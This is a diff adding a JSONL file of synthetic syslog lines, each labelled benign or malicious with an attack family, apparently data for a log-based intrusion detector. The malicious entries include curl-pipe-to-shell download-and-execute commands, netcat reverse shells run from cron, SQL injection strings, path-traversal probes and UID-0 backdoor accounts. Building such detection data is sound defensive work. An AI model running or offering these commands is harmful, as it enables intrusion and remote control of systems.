@@ -1,0 +1,163 @@
+{"line": "Sep 15 13:22:15 sw-core CRON[29715]: (carol) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep 26 03:32:04 db1 sshd[40743]: Failed password for bob from 10.1.220.211 port 38885 ssh2", "label": 0, "family": "ssh-typo"}
+{"line": "Sep 25 18:18:41 db1 sudo: bob : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://185.80.234.23/x.sh | sh'", "label": 1, "family": "sudo-download-exec"}
+{"line": "Sep 18 05:54:39 bastion sshd[43831]: Failed password for invalid user ubuntu from 185.175.77.131 port 32792 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep  4 19:17:56 bastion sshd[13932]: Accepted password for root from 45.146.130.40 port 31666 ssh2", "label": 1, "family": "root-login-external"}
+{"line": "Sep 25 17:17:34 db1 sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "label": 0, "family": "sudo-ok"}
+{"line": "Sep 13 22:42:10 web1 kernel: [4131.590238] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
+{"line": "Sep 20 20:25:53 db1 nginx: 185.23.108.172 - - \"GET /api/v1/status HTTP/1.1\" 200 545 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 11 11:01:28 web1 CRON[19020]: (carol) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep 25 11:30:32 db1 sudo: carol : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://45.150.246.140/x.sh | sh'", "label": 1, "family": "sudo-download-exec"}
+{"line": "Sep  2 10:40:54 web2 nginx: 185.229.245.98 - - \"GET /.env HTTP/1.1\" 200 162 \"-\" \"python-requests/2.31\"", "label": 1, "family": "path-traversal-scan"}
+{"line": "Sep  7 01:09:22 sw-core kernel: [59158.000000] IPTABLES-DROP: IN=eth0 SRC=193.39.158.69 DST=10.0.0.5 PROTO=UDP DPT=5353", "label": 0, "family": "fw-noise"}
+{"line": "Sep 25 01:28:44 db1 nginx: 10.0.232.150 - - \"GET /index.html HTTP/1.1\" 200 6160 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  3 11:24:40 sw-core sshd[8311]: Failed password for deploy from 10.1.133.230 port 44343 ssh2", "label": 0, "family": "ssh-typo"}
+{"line": "Sep 12 18:56:29 sw-core sshd[24367]: Failed password for bob from 10.0.2.200 port 30653 ssh2", "label": 0, "family": "ssh-typo"}
+{"line": "Sep 18 08:09:29 sw-core nginx: 10.2.188.242 - - \"GET /index.html HTTP/1.1\" 200 3440 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 11 15:40:03 web1 nginx: 10.3.158.4 - - \"GET /index.html HTTP/1.1\" 200 5776 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 20 07:07:40 web1 nginx: 10.3.22.70 - - \"GET /index.html HTTP/1.1\" 200 5892 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 19 03:33:39 web1 nginx: 185.66.162.104 - - \"GET /search?q=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep  7 12:50:13 web2 CRON[44233]: (alice) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep  6 05:00:22 web2 CRON[52227]: (www-data) CMD (/bin/sh -c 'nc -e /bin/sh 45.82.239.7 4444')", "label": 1, "family": "reverse-shell-cron"}
+{"line": "Sep 26 00:43:33 web1 nginx: 103.98.77.232 - - \"GET /login.php?user=admin'%20OR%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep 16 02:33:24 db1 useradd[49212]: new user: name=sysadm1n, UID=0, GID=0, home=/root, shell=/bin/bash", "label": 1, "family": "uid0-user-added"}
+{"line": "Sep 12 11:47:21 web2 nginx: 185.231.81.235 - - \"GET /api/v1/status HTTP/1.1\" 200 441 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 11 04:27:32 web1 nginx: 103.19.131.52 - - \"GET /index.php?id=1;DROP%20TABLE%20users HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep 27 04:28:19 sw-core nginx: 203.208.110.44 - - \"GET /api/v1/status HTTP/1.1\" 200 610 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  3 04:32:16 web1 nginx: 91.104.232.94 - - \"GET /login.php?user=admin'%20OR%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep 12 15:09:55 bastion nginx: 91.216.228.172 - - \"GET /api/v1/status HTTP/1.1\" 200 199 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 27 23:40:48 db1 useradd[54049]: new user: name=sysadm1n, UID=0, GID=0, home=/root, shell=/bin/bash", "label": 1, "family": "uid0-user-added"}
+{"line": "Sep 22 05:04:33 web2 CRON[15023]: (www-data) CMD (/bin/sh -c 'nc -e /bin/sh 45.103.125.45 4444')", "label": 1, "family": "reverse-shell-cron"}
+{"line": "Sep  5 05:08:35 sw-core systemd[1]: Started Daily apt download activities.", "label": 0, "family": "system"}
+{"line": "Sep  9 09:31:36 bastion sshd[15042]: Accepted password for root from 193.28.81.95 port 40173 ssh2", "label": 1, "family": "root-login-external"}
+{"line": "Sep 20 00:32:01 bastion sudo: carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "label": 0, "family": "sudo-ok"}
+{"line": "Sep 19 09:18:15 db1 sshd[37001]: Disconnected from user carol 10.3.105.113 port 48093", "label": 0, "family": "ssh-ok"}
+{"line": "Sep 22 04:08:16 db1 sshd[49875]: Failed password for backup from 10.2.115.103 port 58145 ssh2", "label": 0, "family": "ssh-typo"}
+{"line": "Sep 22 10:40:20 web2 CRON[24930]: (www-data) CMD (/bin/sh -c 'nc -e /bin/sh 103.30.138.127 4444')", "label": 1, "family": "reverse-shell-cron"}
+{"line": "Sep 11 21:39:32 db1 sshd[50523]: Accepted publickey for carol from 10.1.101.124 port 39602 ssh2: ED25519 SHA256:abcd", "label": 0, "family": "ssh-ok"}
+{"line": "Sep  4 22:10:23 db1 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "label": 0, "family": "sudo-ok"}
+{"line": "Sep 24 20:56:14 sw-core systemd[1]: Started Daily apt download activities.", "label": 0, "family": "system"}
+{"line": "Sep  4 16:31:59 bastion sshd[12637]: Failed password for invalid user pi from 45.124.233.94 port 33846 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep 24 01:45:24 bastion sshd[48616]: Failed password for invalid user pi from 45.53.24.137 port 56147 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep 18 23:19:50 web2 nginx: 203.61.79.236 - - \"GET /cgi-bin/.%2e/%2e%2e/bin/sh HTTP/1.1\" 403 162 \"-\" \"python-requests/2.31\"", "label": 1, "family": "path-traversal-scan"}
+{"line": "Sep  3 13:36:02 db1 nginx: 103.65.225.58 - - \"GET /api/v1/status HTTP/1.1\" 200 174 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  9 15:14:20 web1 CRON[16878]: (deploy) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep 24 09:32:58 db1 CRON[31832]: (alice) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep 13 23:11:09 bastion CRON[57336]: (deploy) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep  1 08:27:44 web1 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "label": 0, "family": "sudo-ok"}
+{"line": "Sep 24 21:48:46 db1 CRON[18291]: (backup) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep 14 11:26:31 db1 sshd[56040]: Disconnected from user deploy 10.0.4.252 port 38711", "label": 0, "family": "ssh-ok"}
+{"line": "Sep 17 17:48:49 web2 nginx: 91.61.134.29 - - \"GET /api/v1/status HTTP/1.1\" 200 818 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 14 11:40:29 web2 nginx: 203.57.183.24 - - \"GET /api/v1/status HTTP/1.1\" 200 183 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 23 13:50:04 web1 kernel: [20618.000000] IPTABLES-DROP: IN=eth0 SRC=193.146.179.13 DST=10.0.0.5 PROTO=TCP DPT=445 SYN", "label": 1, "family": "port-scan"}
+{"line": "Sep 24 03:54:04 db1 kernel: [67193.247416] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
+{"line": "Sep 21 10:41:49 db1 sshd[5182]: Disconnected from user carol 10.1.238.179 port 44346", "label": 0, "family": "ssh-ok"}
+{"line": "Sep  8 07:49:18 sw-core CRON[14984]: (alice) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep 19 04:34:06 bastion sshd[13788]: Failed password for invalid user pi from 91.209.56.166 port 45737 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep  3 19:18:47 web1 kernel: [28656.000000] IPTABLES-DROP: IN=eth0 SRC=91.227.227.18 DST=10.0.0.5 PROTO=TCP DPT=23 SYN", "label": 1, "family": "port-scan"}
+{"line": "Sep  5 20:21:44 web2 nginx: 10.1.238.23 - - \"GET /index.html HTTP/1.1\" 200 8220 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  1 17:02:35 web2 nginx: 103.21.246.154 - - \"GET /.env HTTP/1.1\" 404 162 \"-\" \"python-requests/2.31\"", "label": 1, "family": "path-traversal-scan"}
+{"line": "Sep  3 10:52:02 web2 nginx: 185.250.10.84 - - \"GET /../../../../etc/passwd HTTP/1.1\" 404 162 \"-\" \"python-requests/2.31\"", "label": 1, "family": "path-traversal-scan"}
+{"line": "Sep 14 14:48:38 db1 kernel: [3810.000000] IPTABLES-DROP: IN=eth0 SRC=45.27.149.167 DST=10.0.0.5 PROTO=UDP DPT=5353", "label": 0, "family": "fw-noise"}
+{"line": "Sep  9 16:10:16 db1 sudo: backup : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://103.209.144.182/x.sh | sh'", "label": 1, "family": "sudo-download-exec"}
+{"line": "Sep 10 07:38:56 bastion sshd[42449]: Failed password for invalid user ubuntu from 185.231.204.38 port 44525 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep 26 23:53:23 web1 sshd[47207]: Disconnected from user alice 10.0.225.20 port 37990", "label": 0, "family": "ssh-ok"}
+{"line": "Sep 13 14:14:03 sw-core sshd[26937]: Disconnected from user deploy 10.1.93.249 port 56322", "label": 0, "family": "ssh-ok"}
+{"line": "Sep 16 08:54:39 web1 sshd[45616]: Accepted publickey for carol from 10.1.44.239 port 35547 ssh2: ED25519 SHA256:abcd", "label": 0, "family": "ssh-ok"}
+{"line": "Sep 10 02:56:35 web1 nginx: 91.120.111.114 - - \"GET /search?q=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep  5 06:32:59 db1 kernel: [77447.000000] IPTABLES-DROP: IN=eth0 SRC=203.247.253.66 DST=10.0.0.5 PROTO=UDP DPT=5353", "label": 0, "family": "fw-noise"}
+{"line": "Sep 13 19:56:38 web1 kernel: [15490.000000] IPTABLES-DROP: IN=eth0 SRC=45.220.31.39 DST=10.0.0.5 PROTO=TCP DPT=22 SYN", "label": 1, "family": "port-scan"}
+{"line": "Sep 16 23:43:44 web1 CRON[40134]: (deploy) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep  5 15:55:52 web2 systemd[1]: Started Daily apt download activities.", "label": 0, "family": "system"}
+{"line": "Sep 17 09:07:07 web1 kernel: [48251.000000] IPTABLES-DROP: IN=eth0 SRC=45.135.99.186 DST=10.0.0.5 PROTO=TCP DPT=3389 SYN", "label": 1, "family": "port-scan"}
+{"line": "Sep 12 07:14:49 web2 kernel: [14362.981481] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
+{"line": "Sep 14 12:24:09 db1 sshd[59569]: Disconnected from user deploy 10.1.126.56 port 44000", "label": 0, "family": "ssh-ok"}
+{"line": "Sep 14 18:52:06 db1 useradd[48977]: new user: name=.hidden, UID=0, GID=0, home=/root, shell=/bin/bash", "label": 1, "family": "uid0-user-added"}
+{"line": "Sep  7 08:27:53 bastion sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "label": 0, "family": "sudo-ok"}
+{"line": "Sep 15 20:23:23 sw-core sshd[41639]: Accepted publickey for backup from 10.2.123.65 port 31268 ssh2: ED25519 SHA256:abcd", "label": 0, "family": "ssh-ok"}
+{"line": "Sep  1 15:17:27 web1 sshd[30405]: Failed password for alice from 10.0.226.142 port 42584 ssh2", "label": 0, "family": "ssh-typo"}
+{"line": "Sep 18 23:52:23 db1 sshd[27842]: Accepted publickey for deploy from 10.2.52.144 port 30450 ssh2: ED25519 SHA256:abcd", "label": 0, "family": "ssh-ok"}
+{"line": "Sep 12 20:10:26 web2 CRON[12503]: (carol) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep 27 10:11:12 bastion sshd[44818]: Accepted password for root from 193.36.84.23 port 45395 ssh2", "label": 1, "family": "root-login-external"}
+{"line": "Sep  1 23:11:03 web1 kernel: [28762.000000] IPTABLES-DROP: IN=eth0 SRC=193.198.25.48 DST=10.0.0.5 PROTO=TCP DPT=22 SYN", "label": 1, "family": "port-scan"}
+{"line": "Sep 10 07:21:21 sw-core kernel: [98352.000000] IPTABLES-DROP: IN=eth0 SRC=185.42.109.242 DST=10.0.0.5 PROTO=UDP DPT=5353", "label": 0, "family": "fw-noise"}
+{"line": "Sep 28 23:35:12 bastion nginx: 10.1.217.54 - - \"GET /index.html HTTP/1.1\" 200 3392 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 18 01:41:02 sw-core CRON[37749]: (bob) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep 26 06:18:31 db1 nginx: 91.188.251.81 - - \"GET /api/v1/status HTTP/1.1\" 200 870 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 10 21:10:38 db1 nginx: 10.1.43.74 - - \"GET /index.html HTTP/1.1\" 200 7203 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 27 02:11:04 web1 nginx: 10.1.159.35 - - \"GET /index.html HTTP/1.1\" 200 5664 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  3 22:11:04 web1 nginx: 185.185.164.212 - - \"GET /login.php?user=admin'%20OR%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep 16 07:30:06 bastion sshd[21637]: Failed password for invalid user oracle from 45.45.122.202 port 50533 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep  2 08:33:40 sw-core kernel: [84618.008662] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
+{"line": "Sep 16 22:51:04 db1 nginx: 10.2.12.229 - - \"GET /index.html HTTP/1.1\" 200 3270 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 11 21:35:07 web2 CRON[34347]: (www-data) CMD (/bin/sh -c 'nc -e /bin/sh 103.37.7.147 4444')", "label": 1, "family": "reverse-shell-cron"}
+{"line": "Sep  5 23:43:30 web2 systemd[1]: Started Daily apt download activities.", "label": 0, "family": "system"}
+{"line": "Sep  4 07:39:24 db1 kernel: [3680.000000] IPTABLES-DROP: IN=eth0 SRC=45.163.217.166 DST=10.0.0.5 PROTO=UDP DPT=5353", "label": 0, "family": "fw-noise"}
+{"line": "Sep 26 01:23:49 web1 nginx: 45.113.112.123 - - \"GET /login.php?user=admin'%20OR%201=1-- HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep 25 10:55:45 bastion sshd[17038]: Failed password for invalid user test from 203.198.145.142 port 54279 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep  4 00:48:22 sw-core systemd[1]: Started Daily apt download activities.", "label": 0, "family": "system"}
+{"line": "Sep 16 17:57:14 web2 sshd[22167]: Failed password for deploy from 10.3.182.120 port 37482 ssh2", "label": 0, "family": "ssh-typo"}
+{"line": "Sep 16 05:07:30 web1 CRON[12033]: (backup) CMD (/usr/local/bin/backup.sh)", "label": 0, "family": "cron"}
+{"line": "Sep 16 03:54:58 web2 nginx: 91.132.240.35 - - \"GET /wp-admin/setup-config.php HTTP/1.1\" 200 162 \"-\" \"python-requests/2.31\"", "label": 1, "family": "path-traversal-scan"}
+{"line": "Sep 18 07:44:38 db1 nginx: 10.3.159.225 - - \"GET /index.html HTTP/1.1\" 200 4159 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  6 07:29:24 web2 sshd[13970]: Failed password for backup from 10.3.140.202 port 42967 ssh2", "label": 0, "family": "ssh-typo"}
+{"line": "Sep 10 14:04:39 bastion sshd[20789]: Failed password for bob from 10.3.23.217 port 39018 ssh2", "label": 0, "family": "ssh-typo"}
+{"line": "Sep  8 07:53:17 bastion sshd[55435]: Accepted password for root from 185.88.246.240 port 57926 ssh2", "label": 1, "family": "root-login-external"}
+{"line": "Sep  8 05:44:56 web1 kernel: [46685.000000] IPTABLES-DROP: IN=eth0 SRC=193.45.5.198 DST=10.0.0.5 PROTO=TCP DPT=1433 SYN", "label": 1, "family": "port-scan"}
+{"line": "Sep 13 16:36:33 bastion nginx: 10.3.184.125 - - \"GET /index.html HTTP/1.1\" 200 7610 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  8 03:15:10 db1 useradd[27624]: new user: name=support, UID=0, GID=0, home=/root, shell=/bin/bash", "label": 1, "family": "uid0-user-added"}
+{"line": "Sep  6 02:09:11 web1 kernel: [64938.114031] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
+{"line": "Sep 10 06:43:15 web2 nginx: 10.0.112.169 - - \"GET /index.html HTTP/1.1\" 200 4902 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 25 01:13:18 db1 sudo: backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "label": 0, "family": "sudo-ok"}
+{"line": "Sep  6 06:44:47 bastion sshd[20519]: Failed password for invalid user admin from 203.253.135.106 port 38291 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep  7 15:12:43 db1 kernel: [26979.000000] IPTABLES-DROP: IN=eth0 SRC=185.33.168.246 DST=10.0.0.5 PROTO=UDP DPT=5353", "label": 0, "family": "fw-noise"}
+{"line": "Sep 22 17:42:30 db1 sudo: carol : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://203.38.32.2/x.sh | sh'", "label": 1, "family": "sudo-download-exec"}
+{"line": "Sep 23 02:05:01 web1 systemd[1]: Started Daily apt download activities.", "label": 0, "family": "system"}
+{"line": "Sep 19 19:41:28 sw-core systemd[1]: Started Daily apt download activities.", "label": 0, "family": "system"}
+{"line": "Sep  9 16:24:25 db1 sudo: backup : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://203.249.231.36/x.sh | sh'", "label": 1, "family": "sudo-download-exec"}
+{"line": "Sep  7 16:19:11 web1 nginx: 193.103.212.28 - - \"GET /login.php?user=admin'%20OR%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep 11 20:54:45 db1 kernel: [53776.458174] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
+{"line": "Sep 10 07:32:16 web2 CRON[7338]: (www-data) CMD (/bin/sh -c 'nc -e /bin/sh 203.22.70.43 4444')", "label": 1, "family": "reverse-shell-cron"}
+{"line": "Sep 10 15:21:09 sw-core nginx: 10.1.92.52 - - \"GET /index.html HTTP/1.1\" 200 5010 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  3 04:45:02 web1 kernel: [6837.000000] IPTABLES-DROP: IN=eth0 SRC=103.63.47.174 DST=10.0.0.5 PROTO=UDP DPT=5353", "label": 0, "family": "fw-noise"}
+{"line": "Sep 22 18:01:46 web2 nginx: 45.30.125.233 - - \"GET /.git/config HTTP/1.1\" 404 162 \"-\" \"python-requests/2.31\"", "label": 1, "family": "path-traversal-scan"}
+{"line": "Sep  2 20:02:55 web2 nginx: 10.1.140.238 - - \"GET /index.html HTTP/1.1\" 200 6466 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 18 19:48:48 web2 nginx: 10.2.183.207 - - \"GET /index.html HTTP/1.1\" 200 633 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 27 03:04:31 web1 kernel: [76949.824458] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
+{"line": "Sep 25 01:17:48 bastion sshd[24193]: Disconnected from user deploy 10.1.243.70 port 59731", "label": 0, "family": "ssh-ok"}
+{"line": "Sep  6 09:45:40 db1 nginx: 45.248.222.151 - - \"GET /api/v1/status HTTP/1.1\" 200 726 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 28 08:50:14 bastion sshd[29590]: Failed password for carol from 10.2.81.252 port 35275 ssh2", "label": 0, "family": "ssh-typo"}
+{"line": "Sep 12 05:30:38 bastion sshd[41141]: Accepted password for root from 193.37.173.206 port 32736 ssh2", "label": 1, "family": "root-login-external"}
+{"line": "Sep 11 14:32:22 bastion sshd[39905]: Failed password for invalid user oracle from 185.215.83.77 port 31298 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep 26 09:30:45 db1 useradd[3245]: new user: name=support, UID=0, GID=0, home=/root, shell=/bin/bash", "label": 1, "family": "uid0-user-added"}
+{"line": "Sep 28 02:10:08 bastion sshd[44149]: Accepted password for root from 193.174.154.63 port 47212 ssh2", "label": 1, "family": "root-login-external"}
+{"line": "Sep 18 18:34:43 bastion nginx: 185.210.243.149 - - \"GET /api/v1/status HTTP/1.1\" 200 403 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  9 08:26:47 sw-core nginx: 10.2.62.13 - - \"GET /index.html HTTP/1.1\" 200 2077 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 17 23:49:23 web2 nginx: 10.1.202.83 - - \"GET /index.html HTTP/1.1\" 200 8337 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  4 04:54:07 web1 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "label": 0, "family": "sudo-ok"}
+{"line": "Sep 12 18:07:15 sw-core kernel: [54239.837418] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
+{"line": "Sep 24 02:49:15 db1 sshd[36829]: Accepted publickey for carol from 10.1.184.120 port 56075 ssh2: ED25519 SHA256:abcd", "label": 0, "family": "ssh-ok"}
+{"line": "Sep 21 20:53:16 bastion kernel: [91956.820934] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
+{"line": "Sep 15 11:50:00 web1 nginx: 185.32.24.105 - - \"GET /search?q=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep 28 21:34:38 web2 nginx: 91.75.113.142 - - \"GET /../../../../etc/passwd HTTP/1.1\" 200 162 \"-\" \"python-requests/2.31\"", "label": 1, "family": "path-traversal-scan"}
+{"line": "Sep 11 19:23:50 bastion sshd[20612]: Failed password for invalid user admin from 185.173.219.119 port 31404 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep 21 20:13:28 bastion nginx: 45.63.15.254 - - \"GET /api/v1/status HTTP/1.1\" 200 405 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 22 14:58:11 sw-core nginx: 10.1.197.2 - - \"GET /index.html HTTP/1.1\" 200 5625 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 25 19:02:01 web2 nginx: 45.123.65.51 - - \"GET /.git/config HTTP/1.1\" 404 162 \"-\" \"python-requests/2.31\"", "label": 1, "family": "path-traversal-scan"}
+{"line": "Sep  6 11:05:27 sw-core sshd[31364]: Disconnected from user deploy 10.3.189.33 port 31557", "label": 0, "family": "ssh-ok"}
+{"line": "Sep 19 14:02:26 web1 kernel: [38857.000000] IPTABLES-DROP: IN=eth0 SRC=45.138.226.231 DST=10.0.0.5 PROTO=UDP DPT=5353", "label": 0, "family": "fw-noise"}
+{"line": "Sep 21 23:30:28 web2 nginx: 203.88.103.98 - - \"GET /api/v1/status HTTP/1.1\" 200 854 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 25 03:53:35 bastion sshd[33173]: Failed password for invalid user ubuntu from 185.174.220.18 port 56929 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep 21 10:20:06 db1 sudo: bob : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://45.221.140.178/x.sh | sh'", "label": 1, "family": "sudo-download-exec"}
+{"line": "Sep  9 11:16:36 bastion sshd[13586]: Failed password for invalid user oracle from 185.30.72.53 port 57911 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep 10 00:35:59 web2 sudo: carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "label": 0, "family": "sudo-ok"}
+{"line": "Sep 11 02:47:38 web1 nginx: 203.183.93.179 - - \"GET /search?q=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.8\"", "label": 1, "family": "sqli"}
+{"line": "Sep 12 14:25:22 bastion sshd[19405]: Failed password for invalid user admin from 103.231.97.254 port 48200 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep  5 19:09:35 bastion sshd[14566]: Accepted password for root from 193.82.68.218 port 56092 ssh2", "label": 1, "family": "root-login-external"}
+{"line": "Sep 15 22:01:28 bastion sshd[29333]: Failed password for invalid user test from 91.216.92.161 port 33841 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep 16 14:58:50 bastion sshd[33533]: Failed password for invalid user oracle from 91.94.178.165 port 38815 ssh2", "label": 1, "family": "ssh-bruteforce"}
+{"line": "Sep 25 09:19:28 db1 nginx: 10.1.78.138 - - \"GET /index.html HTTP/1.1\" 200 1686 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep 28 02:06:27 web2 nginx: 103.159.216.242 - - \"GET /api/v1/status HTTP/1.1\" 200 185 \"-\" \"curl/8.5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  6 16:13:11 bastion sshd[3413]: Accepted password for root from 193.192.50.88 port 42348 ssh2", "label": 1, "family": "root-login-external"}
+{"line": "Sep  6 17:02:13 web1 nginx: 10.3.89.183 - - \"GET /index.html HTTP/1.1\" 200 7590 \"-\" \"Mozilla/5.0\"", "label": 0, "family": "web-ok"}
+{"line": "Sep  8 15:32:29 web1 kernel: [62997.611354] eth0: link up, 1000Mbps, full-duplex", "label": 0, "family": "system"}
